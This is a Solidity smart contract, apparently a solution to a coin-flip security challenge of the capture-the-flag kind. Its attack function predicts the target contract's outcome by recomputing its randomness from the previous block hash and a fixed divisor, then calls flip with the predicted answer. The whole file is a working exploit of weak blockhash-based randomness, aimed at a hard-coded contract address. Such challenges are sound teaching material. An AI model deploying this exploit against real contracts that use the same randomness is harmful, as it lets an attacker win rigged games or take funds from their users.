//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

interface ICoinFlipChallenge {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttack {
    ICoinFlipChallenge public challenge;

    constructor() {
        challenge = ICoinFlipChallenge(address(0x965B74C44b59042fE18588AbB1fA11a7984dfC10));
    }

    function attack() external payable {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        bool side = coinFlip == 1 ? true : false;

        challenge.flip(side);
    }

    receive() external payable {}
}